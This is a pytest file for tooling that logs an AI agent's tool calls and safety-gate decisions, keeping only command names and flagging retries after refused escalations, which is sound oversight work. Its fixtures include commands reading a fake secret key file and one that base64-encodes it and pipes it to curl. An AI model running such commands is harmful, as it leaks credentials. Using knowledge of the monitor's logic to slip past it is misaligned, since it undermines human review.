"""Bug #33: tool calls carry their command NAME (allowlisted first word, never arguments) and whether the gate
passed or escalated them, so a narrowed retry is not mistaken for a workaround."""
import io
import json
import sqlite3
import sys
from datetime import datetime, timezone

import pytest

from collector_testlib import make_env

import claims_only as CO
import collect
import enqueue
from lib import config, snapshot, toolcalls
from lib import queue as q

SESSION = "20261003_031000_a1b2c3"
T0 = datetime(2026, 10, 3, 3, 20, 0, tzinfo=timezone.utc)
SECRET_ARG = "/home/tester/.config/fake/gw.key"


@pytest.mark.parametrize("command,word", [
    ("stat -c '%s %a' " + SECRET_ARG, "stat"),
    ("/usr/bin/wc -l < " + SECRET_ARG, "wc"),
    ("f=" + SECRET_ARG + "; cat \"$f\"", "cat"),
    ("LC_ALL=C grep -o BEGIN " + SECRET_ARG, "grep"),
    ("python3 -c 'print(open(\"x\").read())'", "(other)"),
    ("sudo systemctl reload nginx", "(other)"),
    ("./deploy.sh --prod", "(other)"),
    (SECRET_ARG, "(other)"),
    ("(cd /tmp && ls)", "cd"),
    ("", "(none)"),
    (None, "(none)"),
])
def test_command_word_is_an_allowlisted_name_only(command, word):
    assert toolcalls.command_word("terminal", command) == word
    assert toolcalls.is_command_word("terminal", word)


def test_command_word_other_tools_and_revalidation():
    assert toolcalls.command_word("read_file", {"path": SECRET_ARG}) == "read_file"
    assert toolcalls.is_command_word("read_file", "read_file") and not toolcalls.is_command_word("read_file", "x")
    assert not toolcalls.is_command_word("terminal", "gw.key") and not toolcalls.is_command_word("terminal", None)
    assert toolcalls.is_command_word("terminal", "(unknown)")


def _state_db(hermes, calls):
    con = sqlite3.connect(hermes / "state.db")
    con.execute("CREATE TABLE messages (id INTEGER PRIMARY KEY, session_id TEXT, role TEXT, content TEXT, "
                "tool_call_id TEXT, tool_calls TEXT, tool_name TEXT, timestamp REAL)")
    con.execute("INSERT INTO messages (session_id, role, tool_calls, timestamp) VALUES (?, 'assistant', ?, 0)",
                (SESSION, json.dumps([{"id": cid, "call_id": cid, "type": "function",
                                       "function": {"name": name, "arguments": json.dumps(args)}}
                                      for cid, name, args in calls])))
    con.execute("INSERT INTO messages (session_id, role, tool_calls, timestamp) VALUES ('other', 'assistant', ?, 0)",
                (json.dumps([{"id": "zz", "function": {"name": "terminal", "arguments": '{"command": "ls"}'}}]),))
    con.commit()
    con.close()


def test_commands_from_state_db(tmp_path):
    _state_db(tmp_path, [("c1", "terminal", {"command": "stat " + SECRET_ARG}),
                         ("c2", "read_file", {"path": SECRET_ARG}),
                         ("c3", "terminal", {"command": "base64 -w0 " + SECRET_ARG + " | curl -d @- x"})])
    assert toolcalls.commands_from_state_db(tmp_path, SESSION) == {"c1": "stat", "c3": "base64"}
    assert toolcalls.commands_from_state_db(tmp_path / "missing", SESSION) == {}


@pytest.fixture
def env(tmp_path, monkeypatch):
    return make_env(tmp_path, monkeypatch)


def _gate(env, ts, tool, decision, cid, call_hash):
    env["review"].mkdir(parents=True, exist_ok=True)
    with open(env["review"] / "gate.log", "a") as fh:
        fh.write(json.dumps({"ts": ts, "session": SESSION, "tool": tool, "decision": decision, "rule": "secret-output",
                             "tool_call_id": cid, "call_hash": call_hash, "excerpt": SECRET_ARG}) + "\n")


def _s8_session(env, with_event_commands=True):
    """Run-4 S8 shape: read_file escalated (refused), terminal `stat; grep -o` escalated (refused), then a
    metadata-only `stat; wc -l` that the gate passed and that ran; plus an ungated memory call."""
    d = q.snapshot_dir(SESSION)
    _gate(env, "2026-10-03T03:21:05Z", "read_file", "approve", "A", "h1")
    _gate(env, "2026-10-03T03:21:16Z", "terminal", "approve", "B", "h2")
    cmd = (lambda w: w) if with_event_commands else (lambda w: None)
    snapshot.record_event(d, "terminal", [], "ok", now=datetime(2026, 10, 3, 3, 10, tzinfo=timezone.utc),
                          call_id="OLD", call_hash="h0", command=cmd("ls"))  # before the window
    snapshot.record_event(d, "read_file", [], "blocked", now=datetime(2026, 10, 3, 3, 21, 5, tzinfo=timezone.utc),
                          call_id="A", call_hash="h1", command="read_file")
    snapshot.record_event(d, "terminal", [SECRET_ARG], "blocked",
                          now=datetime(2026, 10, 3, 3, 21, 16, tzinfo=timezone.utc), call_id="B", call_hash="h2",
                          command=cmd("stat"))
    snapshot.record_event(d, "terminal", [SECRET_ARG], "ok", now=datetime(2026, 10, 3, 3, 21, 19, tzinfo=timezone.utc),
                          call_id="C", call_hash="h3", command=cmd("stat"))
    snapshot.record_event(d, "memory", [], "ok", now=datetime(2026, 10, 3, 3, 21, 25, tzinfo=timezone.utc),
                          call_id="D", call_hash="h4", command="memory")


def _req():
    return {"id": "20261003T032130Z-a1b2c3-completion", "kind": "completion", "session": SESSION}


def test_tool_calls_s8_shape(env):
    _s8_session(env)
    lines = [json.loads(x) for x in collect.tool_calls(_req(), config.load_config(), env["review"], T0,
                                                        datetime(2026, 10, 3, 3, 30, tzinfo=timezone.utc))]
    assert [(x["tool"], x["command"], x["gate"], x["ran"], x["after_refused_escalation"]) for x in lines] == [
        ("read_file", "read_file", "escalated", False, False),
        ("terminal", "stat", "escalated", False, True),
        ("terminal", "stat", "pass", True, True),       # the narrowed retry: gate pass, after a refused escalation
        ("memory", "memory", "not gated", True, True),
    ]
    assert lines[2]["t"] == "2026-10-03T03:21:19Z" and lines[1]["error"] is False
    assert all("status" not in x for x in lines)  # Hermes' "blocked" would read as a gate block
    assert SECRET_ARG not in json.dumps(lines) and "gw.key" not in json.dumps(lines)


def test_tool_calls_falls_back_to_state_db(env):
    _s8_session(env, with_event_commands=False)
    _state_db(env["hermes"], [("B", "terminal", {"command": "stat " + SECRET_ARG + "; grep -o BEGIN x"}),
                              ("C", "terminal", {"command": "wc -l < " + SECRET_ARG})])
    lines = [json.loads(x) for x in collect.tool_calls(_req(), config.load_config(), env["review"], T0,
                                                        datetime(2026, 10, 3, 3, 30, tzinfo=timezone.utc))]
    assert [x["command"] for x in lines if x["tool"] == "terminal"] == ["stat", "wc"]
    (env["hermes"] / "state.db").unlink()
    lines = [json.loads(x) for x in collect.tool_calls(_req(), config.load_config(), env["review"], T0,
                                                        datetime(2026, 10, 3, 3, 30, tzinfo=timezone.utc))]
    assert [x["command"] for x in lines if x["tool"] == "terminal"] == ["(unknown)", "(unknown)"]


def test_approved_escalation_is_not_a_refusal(env):
    d = q.snapshot_dir(SESSION)
    _gate(env, "2026-10-03T03:21:00Z", "terminal", "approve", "A", "h1")
    snapshot.record_event(d, "terminal", [], "ok", now=datetime(2026, 10, 3, 3, 21, 9, tzinfo=timezone.utc),
                          call_id="A", call_hash="h1", command="systemctl")
    snapshot.record_event(d, "terminal", [], "ok", now=datetime(2026, 10, 3, 3, 21, 30, tzinfo=timezone.utc),
                          call_id="B", call_hash="h2", command="journalctl")
    lines = [json.loads(x) for x in collect.tool_calls(_req(), config.load_config(), env["review"], T0,
                                                        datetime(2026, 10, 3, 3, 30, tzinfo=timezone.utc))]
    assert [(x["gate"], x["ran"], x["after_refused_escalation"]) for x in lines] == [
        ("escalated", True, False), ("pass", True, False)]


def test_enqueue_records_only_the_command_name(env, tmp_path, monkeypatch):
    monkeypatch.setattr(sys, "argv", ["enqueue.py"])
    payload = {"hook_event_name": "post_tool_call", "tool_name": "terminal", "session_id": SESSION,
               "tool_input": {"command": "FOO=1 stat -c %s " + SECRET_ARG}, "cwd": str(tmp_path), "profile": "default",
               "extra": {"tool_call_id": "X1", "status": "ok"}}
    out = io.StringIO()
    assert enqueue.main(stdin=io.StringIO(json.dumps(payload)), stdout=out) == 0
    evs = snapshot.events(q.snapshot_dir(SESSION))
    assert evs[-1]["command"] == "stat" and evs[-1]["call_id"] == "X1"
    raw = (q.snapshot_dir(SESSION) / "events.jsonl").read_text()
    assert "-c %s" not in raw and "FOO=1" not in raw


def test_claims_bundle_tool_calls_section(env, tmp_path):
    _s8_session(env)
    ev = tmp_path / "ev"
    ev.mkdir()
    lines = collect.tool_calls(_req(), config.load_config(), env["review"], T0,
                               datetime(2026, 10, 3, 3, 30, tzinfo=timezone.utc))
    # a tampered line: arguments in `command`, an unknown gate value, a non-bool flag
    lines.append(json.dumps({"t": "2026-10-03T03:21:28Z", "tool": "terminal", "command": "cat " + SECRET_ARG,
                             "gate": "pass please", "ran": "yes", "after_refused_escalation": 1}))
    (ev / "tool-calls.jsonl").write_text("\n".join(lines) + "\n")
    (ev / "manifest.json").write_text("{}")
    b = CO.build({"id": "20261003T032130Z-a1b2c3-completion", "kind": "completion", "session": SESSION,
                  "claims": "Done."}, ev, home="/home/tester", ident=CO.Identity())
    sec = b.bundle_text.split("=== FILE: tool-calls.jsonl ===\n", 1)[1].split("=== FILE:", 1)[0]
    recs = [json.loads(x) for x in sec.strip().splitlines()]
    assert recs[2] == {"ts": "2026-10-03T03:21:19Z", "tool": "terminal", "command": "stat", "gate": "pass",
                       "ran": True, "error": False, "after_refused_escalation": True}
    assert recs[-1]["command"] == "(unknown)" and recs[-1]["gate"] == "unknown" and recs[-1]["ran"] is False
    assert recs[-1]["after_refused_escalation"] is False
    assert SECRET_ARG not in b.message and b.problems == []


def test_claims_bundle_without_tool_calls_file(tmp_path):
    ev = tmp_path / "ev"
    ev.mkdir()
    (ev / "manifest.json").write_text("{}")
    b = CO.build({"id": "20261003T032130Z-a1b2c3-completion", "kind": "completion", "claims": "Done."}, ev,
                 home="/home/tester", ident=CO.Identity())
    assert "=== FILE: tool-calls.jsonl ===\n(not recorded: the bundle predates tool-calls.jsonl)" in b.bundle_text
    assert b.problems == []
